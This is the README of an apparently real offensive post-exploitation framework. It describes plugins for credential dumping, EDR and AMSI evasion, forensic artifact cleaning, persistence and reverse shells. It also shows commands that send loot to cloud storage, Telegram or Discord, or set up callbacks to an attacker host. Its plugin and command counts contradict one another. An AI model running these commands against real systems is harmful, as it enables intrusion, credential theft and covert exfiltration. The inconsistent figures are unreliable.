# NexShell v2 — Unified Pentest Operations Platform

<div align="center">

```
             .o oOOOOOOOo                                            OOOo
             Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
             OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
             OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
             `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
             .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
             OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
            oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
           oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
          OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
          "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
             Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
             :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?          
                          oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                          '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                               `$"  `OOOO' `O"Y ' `OOOO'  o              
                                      OP"          : o                                 
              Nexus of Shell Operations  ·  Elite Reverse Shell Commander
```

![Python](https://img.shields.io/badge/Python-3.8+-purple?logo=python&logoColor=white)
![Version](https://img.shields.io/badge/Version-2.2.0-blueviolet)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-blue)
![License](https://img.shields.io/badge/License-MIT-lime)
![Author](https://img.shields.io/badge/Author-vulnquest58-orange)
![Files](https://img.shields.io/badge/Files-70%2B%20Python%20%7C%201MB-red)
![Lines](https://img.shields.io/badge/Lines-26%2C000%2B-green)
![Commands](https://img.shields.io/badge/CLI%20Commands-58-orange)
![Plugins](https://img.shields.io/badge/Plugins-58%20Professional-crimson)
![Tools](https://img.shields.io/badge/Tools%20Dir-linux%20%7C%20windows%20%7C%20scripts%20%7C%20loot-teal)

</div>

> **NexShell v2** is a **Unified Pentest Operations Platform** — managing sessions, assets, findings, evidence, transport channels, operation scope, credential inventory, timelines, real-time web dashboards, and a **professional plugin engine** covering modern 2025/2026 attack vectors — all from a single REPL interface. Zero external dependencies except the stdlib.

---

## What's New in v2

| Feature | v1 | v2 |
|---------|:--:|:--:|
| SQLite persistence | ❌ | ✅ |
| Real-time Web Dashboard | ❌ | ✅ |
| WebSocket + HTTP transport | ❌ | ✅ |
| Operation scope + timeline + checklist | ❌ | ✅ |
| Service inventory + credential store | ❌ | ✅ |
| Persistent notes | ❌ | ✅ |
| Engagement templates (4 types) | ❌ | ✅ |
| Asset inventory (Hosts) | ❌ | ✅ |
| Security findings | ❌ | ✅ |
| Evidence + chain of custody | ❌ | ✅ |
| MITRE ATT&CK mapping (30+ TTPs) | ❌ | ✅ |
| Attack playbooks | ❌ | ✅ |
| Automated workflows (DAG) | ❌ | ✅ |
| Professional plugin engine | ❌ | ✅ |
| Rule engine (8 built-in rules) | ❌ | ✅ |
| Report generation (MD/HTML/JSON) | ❌ | ✅ |
| Health monitor + analytics | ❌ | ✅ |
| OPSEC profiles (ghost/paranoid) | basic | ✅ full |
| Event bus (async pub/sub) | ❌ | ✅ |
| **58 Professional Plugins** | ❌ | ✅ |
| **Cloud/K8s/AD/Container coverage** | ❌ | ✅ |
| **2025-2026 CVE detection** | ❌ | ✅ |
| **Professional REPL (prompt_toolkit + Rich)** | ❌ | ✅ |
| **Tools directory (linux/windows/scripts/loot)** | ❌ | ✅ |

---

## Architecture

```
nexshell/
├── nexshell.py              # Main REPL — 57 CLI commands, 3,900+ lines
├── nexshell_repl.py         # 🆕 Professional REPL (prompt_toolkit + Rich)
│
├── core/                    # Framework kernel
│   ├── event_bus.py         # Async pub/sub event dispatcher
│   ├── plugin.py            # NexPlugin base + auto-discovery registry
│   ├── rules.py             # Rule engine — 8 auto-detection rules
│   ├── scheduler.py         # Priority task queue + background workers
│   └── workflow.py          # DAG workflow engine — 4 built-in workflows
│
├── db/                      # SQLite persistence layer
│   ├── database.py          # NexDB — full CRUD for all entities
│   └── schema_v2.py         # Schema: hosts, findings, operations, evidence
│
├── modules/                 # Transport + utilities
│   ├── transport.py         # TLS listener + HTTP tunnel v1
│   ├── transport/           # v2 enhanced transport package
│   │   ├── http_tunnel.py   # HTTP covert channel (XOR, multi-agent, jitter)
│   │   └── websocket.py     # RFC 6455 WebSocket (multi-client, ping/pong)
│   ├── loot.py              # Loot collection → SQLite
│   └── session_manager.py
│
├── web/                     # Real-time Web Dashboard (stdlib only)
│   ├── server.py            # HTTP + WebSocket combined server
│   └── templates/
│       ├── index.html       # Dark-mode dashboard — 7 views
│       ├── style.css        # Premium CSS — CSS vars, animations
│       └── app.js           # Real-time WS client + REST fallback
│
├── operations/              # Engagement management
│   ├── operation.py         # Operation workspace (scope, objectives)
│   ├── scope.py             # CIDR scope manager + in/out-of-scope check
│   ├── timeline.py          # Engagement timeline — 10 event types
│   └── checklist.py         # Pentest (25 items) + CTF (10 items) checklists
│
├── inventory/               # Asset intelligence
│   ├── hosts.py             # HostInventory + FindingsManager + attack graph
│   ├── services.py          # ServiceInventory — 60+ port maps, nmap parser
│   ├── credentials.py       # CredentialStore — dedup, type detect, crack track
│   └── tags.py              # Tagging system
│
├── knowledge/               # OSINT + reference knowledge
│   ├── mitre.py             # MITRE ATT&CK (30+ TTPs) + PlaybookEngine
│   └── notes.py             # Persistent notes — search, pin, tag, export
│
├── evidence/                # Chain of custody
│   └── collector.py         # SHA256 hash, timestamp, ZIP export
│
├── reports/                 # Report generation
│   └── reporter.py          # Markdown + HTML + JSON output
│
├── config/                  # Configuration management
│   ├── profiles.py          # 3 OPSEC profiles + 4 operator roles
│   └── templates.py         # 4 engagement templates
│
├── services/                # Platform services
│   └── health.py            # Health monitor + analytics engine
│
├── models/                  # Shared data models
│   └── __init__.py          # Host, Service, Finding, Evidence, Operation
│
├── plugins/                 # 58 auto-discovered professional plugins
│   │
│   │   # ── Wave 1 — Core Recon & Post-Exploitation ─────────────────────
│   ├── auto_enum_linux.py        # Linux post-exploitation enumeration v3.0
│   ├── auto_enum_windows.py      # Windows post-exploitation enumeration v3.0
│   ├── privesc_scanner.py        # Linux privilege escalation scanner v3.0
│   ├── cred_hunter.py            # Multi-source credential hunter v3.0
│   ├── network_scout.py          # Network discovery + banner grabbing v3.0
│   ├── persistence_check.py      # Persistence mechanism detection v3.0
│   ├── cloud_recon.py            # Cloud recon (AWS/GCP/Azure/K8s) v1.0
│   ├── ad_attack.py              # Active Directory attack suite v1.0
│   ├── container_escape.py       # Container/K8s escape detection v1.0
│   ├── lateral_mover.py          # Lateral movement vector assessment v1.0
│   │
│   │   # ── Wave 2 — Advanced Attack Modules ────────────────────────────
│   ├── amsi_bypass.py            # AMSI bypass suite v2.0
│   ├── api_enum.py               # API endpoint enumeration v2.0
│   ├── artifact_cleaner.py       # Forensic artifact cleaner v2.0
│   ├── attack_path_analyzer.py   # Attack path analysis v2.0
│   ├── browser_cred_extractor.py # Browser credential extractor v2.0
│   ├── capabilities_exploiter.py # Linux capabilities exploiter v2.0
│   ├── data_exfiltrator.py       # Multi-channel data exfiltrator v2.0
│   ├── database_enum.py          # Database enumeration v2.0
│   ├── dns_enum.py               # DNS enumeration v2.0
│   ├── edr_evasion_suite.py      # EDR evasion techniques v2.0
│   ├── email_enum.py             # Email enumeration v2.0
│   ├── etw_patcher.py            # ETW event tracing patcher v2.0
│   ├── kernel_exploit_suggester.py # Kernel exploit suggester v2.0
│   ├── kernel_module_loader.py   # Kernel module loader v2.0
│   ├── lsass_dumper.py           # LSASS memory dumper v2.0
│   ├── network_pivot_detector.py # Network pivot detector v2.0
│   ├── network_topology_mapper.py # Network topology mapper v2.0
│   ├── ntds_extractor.py         # NTDS.dit extractor v2.0
│   ├── ntlm_relay_automator.py   # NTLM relay automator v2.0
│   ├── obfuscation_engine.py     # Multi-technique obfuscation v2.0
│   ├── pass_the_hash.py          # Pass-the-hash toolkit v2.0
│   ├── persistence_implanter.py  # Multi-mechanism persistence v2.0
│   ├── process_injection_suite.py # Process injection techniques v2.0
│   ├── psexec_automator.py       # PsExec automator v2.0
│   ├── rdp_pivot.py              # RDP pivot & hijacking v2.0
│   ├── risk_scoring_engine.py    # CVSS-based risk scoring v2.0
│   ├── sam_hive_extractor.py     # SAM hive extractor v2.0
│   ├── smb_exploiter.py          # SMB exploitation suite v2.0
│   ├── ssh_enum.py               # SSH enumeration v2.0
│   ├── ssh_pivot_automator.py    # SSH pivot automator v2.0
│   ├── sudo_abuse_suite.py       # Sudo abuse techniques v2.0
│   ├── timestomper.py            # Timestamp manipulation v2.0
│   ├── token_impersonator.py     # Windows token impersonation v2.0
│   ├── uac_bypass_suite.py       # UAC bypass suite v2.0
│   ├── vault_cred_extractor.py   # Windows Credential Manager v2.0
│   ├── web_app_enum.py           # Web application enumeration v2.0
│   ├── windows_kernel_exploit.py # Windows kernel exploits v2.0
│   ├── windows_privesc_automator.py # Windows privesc automation v2.0
│   └── wmi_executor.py           # WMI-based execution v2.0
│   │
│   │   # ── Wave 3 — Post-Exploitation Engine ───────────────────────────
│   ├── smart_tty_upgrade.py      # 7-stage TTY upgrade engine v2.0
│   ├── file_transfer_engine.py   # 12-method file transfer v2.0
│   ├── persistence_engine.py     # 16-mechanism persistence v2.0
│   ├── port_sniffer.py           # Port scan + session recorder v2.0
│   ├── local_file_sharer.py      # HTTP file share from tools/ v2.0
│   ├── reverse_shell_generator.py # 20+ payloads + obfuscation v2.0
│   ├── command_queue.py          # SQLite command queue + retry v2.0
│   └── cloud_integration.py      # S3/Azure/GCS + notifications v2.0
│
└── tools/                   # Shared tools directory
    ├── linux/               # Linux: linpeas, pspy64, socat, chisel...
    ├── windows/             # Windows: winpeas, mimikatz, Rubeus...
    ├── scripts/             # Helper scripts
    ├── loot/                # Extracted files (auto-populated)
    └── README.md            # Usage guide
```

---

## Quick Start

```bash
git clone https://github.com/vulnquest58/nexshell
cd nexshell
python nexshell.py
```

```
(NexShell)> help               # Show all 57 commands
(NexShell)> web start          # Launch real-time dashboard → http://localhost:8888
(NexShell)> plugins list       # List all 11 loaded plugins
(NexShell)> health             # System health check
```

```bash
git clone https://github.com/vulnquest58/nexshell
cd nexshell
python nexshell.py          # Classic REPL
pip install prompt_toolkit rich
python nexshell_repl.py     # Professional REPL (recommended)
```

```
# Classic REPL
(NexShell)> help               # All 57 commands
(NexShell)> web start          # Dashboard → http://localhost:8888
(NexShell)> plugins list       # List 58 plugins
(NexShell)> health             # System health

# Professional REPL — Metasploit-style
python nexshell_repl.py -p 4444             # Start with listener
python nexshell_repl.py -p 4444 --op ops1  # Named operation
python nexshell_repl.py --opsec ghost      # Ghost OPSEC mode
NexShell > plugins list        # Rich table output
NexShell > payloads --lhost 10.10.14.1 --lport 4444
NexShell > share --linux       # HTTP server for tools/linux/
NexShell > help                # Full command reference
```

---

## Professional REPL (nexshell_repl.py)

A **Metasploit-style** interactive interface built on `prompt_toolkit` + `Rich`.

```
             .o oOOOOOOOo                          OOOo
             Ob.OOOOOOOo ...
┌───────────────────────────────────────────────────────────┐
│  NexShell v2.2  ·  Unified Post-Exploitation Platform  │
│  author: vulnquest58  plugins: 58  stdlib-only: ✓      │
└───────────────────────────────────────────────────────────┘
  ✓ 58 plugins loaded  op: ops1  opsec: normal
  Type help for commands.  Tab = autocomplete.  ↑↓ = history.

NexShell > _
 NexShell v2.2 │ sessions: 0 │ listeners: 1 │ plugins: 58 │ op: ops1 │ opsec: normal │ 22:00 UTC
```

| Feature | Details |
|---------|--------|
| **Tab completion** | All 41 commands + all 58 plugin names |
| **History** | Persistent across sessions (`.nexshell/history`) |
| **Auto-suggest** | Arrow `→` to accept suggestions from history |
| **Bottom toolbar** | Live sessions/listeners/plugins/opsec/time |
| **Rich tables** | `help`, `sessions`, `plugins list`, `payloads` |
| **Progress spinner** | Shows during plugin execution |
| **`-p PORT`** | Auto-start listeners at launch |
| **`--op NAME`** | Named operation context |
| **`--opsec PROFILE`** | `normal` / `ghost` / `paranoid` at startup |
| **`--no-banner`** | Skip banner for scripted use |

---


NexShell v2.1 ships with **19 professional-grade plugins** organized in three waves.
Every plugin features:
- ✅ Auto-finding generation with **severity mapping** (Critical/High/Medium/Low)
- ✅ **MITRE ATT&CK** technique tagging on every finding
- ✅ **Exploitation guidance** embedded in findings
- ✅ Automatic **loot collection** to SQLite
- ✅ **EventBus** integration for real-time dashboard push
- ✅ Coverage of **2025–2026 CVEs** and modern attack vectors

### Wave 1 — Core Plugins (v3.0)

> Upgraded from v2.0 with modern 2025-2026 threat coverage.

#### `auto-enum-linux` · Linux Post-Exploitation Enumeration
```
(NexShell)> plugins run auto-enum-linux
```
- System info, kernel, OS details
- Users, sudo rights, SUID/GUID binaries
- Network interfaces, open ports, ARP table
- **Cloud/K8s context** — AWS/GCP/Azure IMDS, K8s service account tokens
- **eBPF** process/socket tracking programs
- **SELinux/AppArmor** policy detection
- Sudo CVE-2023-22809 (Edit) detection
- PwnKit (CVE-2021-4034) detection
- 2025-2026 CVE checks: CVE-2025-32462/32463, CVE-2026-3888 (Snapd)

---

#### `auto-enum-windows` · Windows Post-Exploitation Enumeration
```
(NexShell)> plugins run auto-enum-windows
```
- System info, patches, installed software
- Local users, groups, privileges
- **Entra ID (Azure AD)** — `dsregcmd /status`, PRT token detection
- **Microsoft Defender** exclusions + disabled features
- **LAPS** (Legacy + Windows LAPS) password read attempts
- **DPAPI** credential blobs location
- **GPP** cpassword in SYSVOL
- **AppLocker** and **WDAC** policy extraction
- **BitLocker** status and recovery key exposure
- **WSUS-over-HTTP** (MitM attack surface)
- Token manipulation: SeImpersonatePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege

---

#### `privesc-scanner` · Linux Privilege Escalation Scanner
```
(NexShell)> plugins run privesc-scanner
```
- SUID/SGID binaries with **GTFOBins** mapping
- Writable directories in `$PATH`
- Sudo misconfigurations
- World-writable files and cron jobs
- Kernel exploit mapping for 2025-2026 CVEs:
  - CVE-2025-32462 / CVE-2025-32463 (sudo heap overflow)
  - CVE-2026-3888 (Snapd privilege escalation)
  - CVE-2024-1086 (nf_tables use-after-free)
  - CVE-2023-4911 (Looney Tunables glibc)
- Container/cloud breakout indicators
- `LD_PRELOAD` / `LD_LIBRARY_PATH` abuse detection

---

#### `cred-hunter` · Multi-Source Credential Hunter
```
(NexShell)> plugins run cred-hunter
```
- Config files, shell histories, `.env` files
- **IaC & Terraform** state files (plaintext secrets)
- **SaaS tokens**: Stripe, Twilio, SendGrid, Vercel, NPM, GitHub, Slack
- **Cloud credentials**: AWS keys, GCP ADC, Azure tokens
- **Database connection strings**: MongoDB, PostgreSQL, MySQL, MSSQL URIs
- Docker registry configs, Kubernetes secrets
- SSH private keys, GPG keys
- Browser saved passwords (Chrome/Firefox profiles)
- Deduplicated regex extraction across all sources

---

#### `network-scout` · Network Discovery & Enumeration
```
(NexShell)> plugins run network-scout
(NexShell)> plugins run network-scout --nmap
```
- Network interface enumeration (IPv4 + **IPv6**)
- **nmap integration** with banner grabbing
- ARP table, routing table, DNS resolution
- **Kubernetes & DevOps ports**: 6443, 8080, 2379 (etcd), 10250 (kubelet), 9090 (Prometheus), 9200 (Elasticsearch)
- **Cloud provider ports**: IMDS endpoints, Azure 169.254.169.254
- **gRPC/Istio** service mesh detection
- **SMBv1** EternalBlue detection
- Service fingerprinting for 80+ port types
- Firewall rule enumeration

---

#### `persistence-check` · Persistence Mechanism Detection
```
(NexShell)> plugins run persistence-check
```
Linux vectors:
- systemd units, cron/at jobs, init.d, rc.local
- `~/.bashrc`, `~/.profile`, `~/.bash_profile`, `~/.zshrc`
- **D-Bus/Polkit** service files
- **udev** rules, **logrotate** postrotate
- **apt/dpkg** hook scripts
- **Python sitecustomize** injection
- **cloud-init** user scripts
- **eBPF** persistent programs
- **MOTD** scripts

Windows vectors:
- Registry Run keys (HKCU/HKLM)
- Scheduled Tasks, Services
- **COM object** hijacking (HKCU registry)
- **SSP/LSA** security packages
- **WMI** subscriptions (Filter/Consumer/Binding)
- **AppInit_DLLs**
- **WSL** persistence paths
- **IIS** module & webshell detection

Cloud vectors:
- **Azure AD** application secrets & service principals
- **CI/CD** hook scripts (GitHub Actions, GitLab CI)

---

### Wave 2 — New Critical Plugins (v1.0)

> New plugins targeting modern enterprise attack surfaces.

#### `cloud-recon` · Cloud Environment Enumeration
```
(NexShell)> plugins run cloud-recon
(NexShell)> plugins run cloud-recon --provider aws
(NexShell)> plugins run cloud-recon --deep
```
**MITRE:** T1552.005 — Cloud Instance Metadata API

**AWS (16 checks):**
- IMDSv1 / IMDSv2 token-based access
- IAM role enumeration + **credential chain stealing**
- User-data (cloud-init) secrets extraction
- ECS container credentials
- Lambda environment variable secrets
- AWS SSO cache access token extraction
- Local `~/.aws/credentials` and config files

**GCP (12 checks):**
- GCP Metadata service (v1 + v2)
- **Service account OAuth2 token theft**
- SA scopes enumeration
- Instance attributes (secrets in metadata)
- SSH keys in metadata
- Application Default Credentials (`~/.config/gcloud/`)

**Azure (9 checks):**
- IMDS instance enumeration
- **Managed Identity token** for ARM API
- **Managed Identity token** for Key Vault
- **Managed Identity token** for Microsoft Graph
- Azure CLI token cache (`~/.azure/accessTokens.json`)
- App Service / Functions MSI endpoint

**Kubernetes (12 checks):**
- ServiceAccount JWT token extraction
- **K8s API server** reachability + auth
- `kubectl auth can-i --list` RBAC enumeration
- Cluster-admin wildcard detection (`*/*/* `)
- Secrets listing capability
- kubeconfig enumeration

**IaC (7 checks):**
- Terraform state files (`terraform.tfstate`)
- `.tfvars` secret files
- Pulumi credentials (`~/.pulumi/credentials.json`)
- Ansible vault password files and plaintext passwords

---

#### `ad-attack` · Active Directory Attack Suite
```
(NexShell)> plugins run ad-attack
(NexShell)> plugins run ad-attack --enumerate-only
(NexShell)> plugins run ad-attack --adcs
```
**MITRE:** T1558 — Steal or Forge Kerberos Tickets

**Kerberos Attacks:**
- **Kerberoasting** — SPN enumeration (user + computer)
- **AS-REP Roasting** — accounts with pre-auth disabled
- **Unconstrained delegation** computers & users
- **Constrained delegation** (S4U2Proxy chains)
- **Resource-Based Constrained Delegation (RBCD)**
- TrustedToAuthForDelegation detection

**AD CS (Certificate Services) — ESC1-ESC11:**
- Certificate Authority enumeration
- Vulnerable template detection (ENROLLEE_SUPPLIES_SUBJECT)
- SubCA template abuse (ESC3/ESC4)
- Web Enrollment interface detection (ESC6/ESC8)
- Template ACL analysis

**Modern Attacks:**
- **Shadow Credentials** (`msDS-KeyCredentialLink`) — Whisker/PyWhisker
- **GMSA** (Group Managed Service Accounts) — password extraction
- **RODC** (Read-Only DC) password replication abuse
- LDAP signing & channel binding assessment
- **DNS Admins** → DLL injection into dns.exe → SYSTEM on DC
- **Backup Operators** → SeBackupPrivilege → NTDS.DIT dump

**Access Control:**
- DCSync-capable ACEs detection (DS-Replication-Get-Changes)
- **GenericAll / WriteDACL** on privileged objects
- **AdminSDHolder** permissions analysis
- Exchange PrivExchange path (CVE-2019-0825)

**Infrastructure:**
- Domain controllers (incl. **RODC** detection)
- Forest trusts + SID filtering status + TGT delegation
- Machine Account Quota (MAQ > 0 = RBCD path)
- KRBTGT password age (Golden Ticket feasibility)
- Legacy OS detection (XP/Vista/2003/2000)
- **Print Spooler** status (PetitPotam/PrintNightmare)
- GPP cpassword in SYSVOL
- LAPS (Legacy `ms-Mcs-AdmPwd` + Windows `msLAPS-Password`)
- Password policy (lockout threshold, complexity, spraying feasibility)
- LLMNR / NBT-NS / WPAD relay surface

**Attack Path Summary:** Auto-generates exploitation chains at scan completion

**Relevant CVEs:** CVE-2024-21320 (Kerberos Relay), CVE-2021-1675 (PrintNightmare), CVE-2022-26923 (AD CS)

---

#### `container-escape` · Container & Kubernetes Security
```
(NexShell)> plugins run container-escape
(NexShell)> plugins run container-escape --check-only
(NexShell)> plugins run container-escape --k8s-only
```
**MITRE:** T1611 — Escape to Host

**Runtime Detection:**
- Docker, Podman, containerd, LXC, **gVisor (runsc)**, **Kata Containers**, **Firecracker**, Singularity/Apptainer
- AWS Fargate/ECS, Azure Container Instances, GCP Cloud Run
- Container runtime version fingerprinting

**Capability Analysis:**
- `CapEff` hex decoding — automatic privileged container detection
- Dangerous cap detection: `CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_PTRACE`, `CAP_NET_RAW`, `CAP_SYS_CHROOT`, `CAP_DAC_OVERRIDE`, `CAP_SETUID`
- `NoNewPrivileges` flag check
- Seccomp profile status
- AppArmor profile detection (unconfined detection)
- SELinux context
- Landlock LSM

**Classic Escapes:**
- **Docker socket** mounted (`/var/run/docker.sock`) — trivial escape
- **cgroup v1 release_agent** write (CAP_SYS_ADMIN + writable cgroup)
- **binfmt_misc** enabled → custom binary format execution
- **core_pattern** pipe abuse
- `/proc/1/root`, `/proc/1/fd` host filesystem access
- Block device access (`/dev/sda`, `/dev/nvme0n1`)
- Host `/` mounted read-write

**Kubernetes Escapes:**
- ServiceAccount JWT token + RBAC enumeration
- **Cluster-admin** privilege detection
- `kubectl auth can-i create pods/exec` (lateral movement)
- **Ephemeral container** creation (pod injection)
- **Kubelet API** unauthenticated port 10250 + read-only 10255
- **etcd direct access** (port 2379) — full cluster state
- K8s API anonymous access
- Admission controller (mutating/validating webhooks) enumeration
- Pod security context analysis
- **Istio/Linkerd** sidecar — Envoy admin API exposure

**Cloud-Native:**
- AWS/GCP/Azure IMDS from inside container — IAM credential theft
- EKS IRSA token, Azure Workload Identity token
- CRI-O socket detection

**CVE Checks (2019-2026):**

| CVE | Software | Description | Severity |
|-----|----------|-------------|----------|
| CVE-2024-21626 | runc < 1.1.12 | Leaky Vessels workingDir escape | Critical |
| CVE-2024-10220 | runc < 1.1.13 | Container breakout | Critical |
| CVE-2024-41110 | Docker < 27.3.1 | AuthZ plugin bypass | Critical |
| CVE-2024-45310 | containerd < 1.7.22 | shim API escape | Critical |
| CVE-2024-23651-3 | BuildKit < 0.16.0 | Secret leak / breakout | Critical |
| CVE-2024-53425 | Podman < 5.2.2 | Info leak | Medium |
| CVE-2023-2640/32629 | Ubuntu OverlayFS | LPE (AlienCrash) | Critical |
| CVE-2020-15257 | containerd < 1.6.0 | shim API exposure | High |
| CVE-2019-5736 | runc < 1.0.0 | runc exec overwrite | Critical |

---

#### `lateral-mover` · Lateral Movement Vector Assessment
```
(NexShell)> plugins run lateral-mover
(NexShell)> plugins run lateral-mover --target 192.168.1.10
(NexShell)> plugins run lateral-mover --subnet 192.168.1.0/24
```
**MITRE:** T1021 — Remote Services

**Local Assessment (Windows):**
- Current privileges + token analysis (`whoami /all`)
- **Kerberos ticket cache** — Pass-the-Ticket detection (`klist`)
- **Stored credentials** (`cmdkey /list`) — runas /savedcred
- **WDigest** credential caching detection (plaintext in LSASS)
- Active TCP connections + ARP table (known hosts)
- Domain network view (`net view /all /domain`)
- RDP active sessions (`query session`)
- Local share enumeration
- **SMB signing** status — relay attack feasibility
- **LLMNR / NBT-NS** status (Responder target assessment)

**Local Assessment (Linux):**
- **Kerberos cache files** (`/tmp/krb5cc_*`) — Pass-the-Ticket
- **SSH private keys** in `~/.ssh/` — key reuse testing
- **SSH known_hosts** — identifies lateral movement targets
- SSH config (ProxyJump, IdentityFile hints)
- `.netrc`, `.pgpass`, `.my.cnf` — plaintext credentials
- Git remote URLs (credential exposure)
- nsswitch / LLMNR (Linux NTLM relay surface)

**Remote Target Enumeration (up to 20 hosts):**
- SMB null session testing
- **ADMIN$ / C$ share** access (credential reuse)
- WMI remote execution (`wmic /node:target`)
- **WinRM / PS-Remoting** (`Test-WSMan`)
- SSH key-based authentication test
- Port availability: 22/445/3389/5985

**Lateral Movement Path Summary:** Auto-generates actionable attack chains

---

### Plugin Usage

```bash
# List all loaded plugins
(NexShell)> plugins list

# Run a specific plugin (active session)
(NexShell)> plugins run cloud-recon
(NexShell)> plugins run ad-attack --enumerate-only
(NexShell)> plugins run container-escape --k8s-only
(NexShell)> plugins run lateral-mover --subnet 10.10.10.0/24

# View plugin details
(NexShell)> plugins info cloud-recon

# Get plugin findings
(NexShell)> finding list
(NexShell)> finding show --severity critical
```

---

### Wave 3 — Post-Exploitation Engine (v2.0) 🆕

> Advanced post-exploitation suite built on top of the NexShell plugin engine. Zero external dependencies — stdlib only.

#### `smart-tty-upgrade` · 7-Stage TTY Upgrade Engine
```
(NexShell)> plugins run smart-tty-upgrade
(NexShell)> plugins run smart-tty-upgrade --stage python
(NexShell)> plugins run smart-tty-upgrade --check
```
**MITRE:** T1059 — Command & Scripting Interpreter

- Auto-detects best upgrade method: python3 → python → perl → expect → socat → script → /bin/sh fallback
- Configures `TERM=xterm-256color`, `stty rows/cols`, `SHELL=/bin/bash`
- Shell indicator detection for success confirmation

---

#### `file-transfer-engine` · 12-Method File Transfer
```
(NexShell)> plugins run file-transfer-engine --upload /path/to/file
(NexShell)> plugins run file-transfer-engine --detect
(NexShell)> plugins run file-transfer-engine --method http-curl
```
**MITRE:** T1105 — Ingress Tool Transfer

- **Linux:** base64, wget, curl, python3-http, nc, socat, scp, rsync
- **Windows:** certutil, PowerShell IWR, bitsadmin, mshta
- Auto-detects available methods via `which`/`where`
- SHA256 integrity verification on every transfer
- Stealth-aware method selection (OPSEC scoring)

---

#### `persistence-engine` · 16-Mechanism Persistence
```
(NexShell)> plugins run persistence-engine --list
(NexShell)> plugins run persistence-engine --mechanism systemd
(NexShell)> plugins run persistence-engine --auto-reconnect --lhost 10.0.0.1 --lport 4444
(NexShell)> plugins run persistence-engine --remove --mechanism crontab
```
**MITRE:** T1547, T1053, T1543, T1546

| Mechanism | Platform | Root? | Risk |
|-----------|----------|-------|------|
| User Crontab | Linux | No | Medium |
| System Crontab | Linux | Yes | High |
| Cron.d Drop | Linux | Yes | Medium |
| Systemd User Service | Linux | No | Low |
| Systemd System Service | Linux | Yes | Medium |
| RC.Local | Linux | Yes | High |
| Bash Profile | Linux | No | Low |
| Profile.d Drop | Linux | Yes | Medium |
| SSH Authorized Keys | Linux | No | Medium |
| Registry Run HKCU | Windows | No | Low |
| Registry Run HKLM | Windows | Yes | Medium |
| Scheduled Task | Windows | No | Medium |
| Startup Folder | Windows | No | High |
| WMI Event Subscription | Windows | Yes | Medium |
| Windows Service | Windows | Yes | Medium |

- Auto-reconnect payloads with **exponential backoff** (bash + Python3)
- Detection risk scoring per mechanism
- Auto-select based on privilege level

---

#### `port-sniffer` · Port Scanner & Session Recorder
```
(NexShell)> plugins run port-sniffer --scan
(NexShell)> plugins run port-sniffer --scan --target 192.168.1.5
(NexShell)> plugins run port-sniffer --record=4444
(NexShell)> plugins run port-sniffer --stop=4444
```
**MITRE:** T1040, T1049

- Parallel scan of ports 1000-9999 (200 threads)
- Protocol fingerprinting: SSH, HTTP, FTP, Telnet, raw TCP, reverse shells
- Banner grabbing + reverse shell detection heuristics
- Background TCP session recording to timestamped `.log` files
- Remote scan via target session (`--remote`)

---

#### `local-file-sharer` · Smart HTTP File Server
```
(NexShell)> plugins run local-file-sharer            # share tools/
(NexShell)> plugins run local-file-sharer --linux    # share tools/linux/
(NexShell)> plugins run local-file-sharer --windows  # share tools/windows/
(NexShell)> plugins run local-file-sharer --tree     # show directory tree
(NexShell)> plugins run local-file-sharer --file tools/linux/linpeas.sh
```
**MITRE:** T1105

- Default share directory: `nexshell/tools/` (project-relative)
- Auto port detection: 9001-9100 (finds first free port)
- ASCII URL box + per-file wget/curl/PowerShell download commands
- Download counter, auto-stop after N downloads
- Multiple simultaneous shares supported

---

#### `reverse-shell-gen` · 20+ Payload Generator
```
(NexShell)> plugins run reverse-shell-gen --lhost 10.0.0.1 --lport 4444
(NexShell)> plugins run reverse-shell-gen --lang python3 --obfuscate
(NexShell)> plugins run reverse-shell-gen --list
(NexShell)> plugins run reverse-shell-gen --all
```
**MITRE:** T1059, T1027

Linux payloads: bash /dev/tcp, exec bash, sh, python3-pty, python3-subprocess, python2, perl, ruby, php, awk, socat, netcat, openssl (encrypted), nodejs

Windows payloads: PowerShell, PowerShell-Base64, python3-windows, mshta, certutil

**Obfuscation:** Base64 wrap, variable substitution, char array, AMSI bypass wrapper

---

#### `command-queue` · SQLite Command Queue
```
(NexShell)> plugins run command-queue --add "whoami" --session 1 --priority 1
(NexShell)> plugins run command-queue --run --session 1
(NexShell)> plugins run command-queue --dry-run --session 1
(NexShell)> plugins run command-queue --list
```
**MITRE:** T1651

- SQLite-backed queue survives NexShell restarts
- Priority-based execution (1 = highest, 10 = lowest)
- Retry logic with exponential backoff (configurable max_retries)
- Dry-run mode: preview commands without executing
- Auto-execute on session reconnect
- Per-session queues with status tracking (pending/running/done/failed)

---

#### `cloud-integration` · Cloud Exfil & Notifications
```
(NexShell)> plugins run cloud-integration --telegram --token TOKEN --chat CHAT_ID --msg "pwned!"
(NexShell)> plugins run cloud-integration --dc-webhook URL --msg "shell acquired"
(NexShell)> plugins run cloud-integration --s3 PRESIGNED_URL --upload-loot
(NexShell)> plugins run cloud-integration --test
```
**MITRE:** T1567, T1567.002

- **Upload backends:** AWS S3 (presigned URL), Azure Blob (SAS), GCS (signed URL), custom HTTP
- **Notification channels:** Telegram Bot API, Discord Webhook, Slack Incoming Webhook
- Loot directory auto-collection (`tools/loot/`)
- XOR encryption before upload (no external crypto libs)
- Send files directly to Telegram (documents)
- Zero dependencies — stdlib `urllib` only

---



### Transport & Shells
| Command | Description |
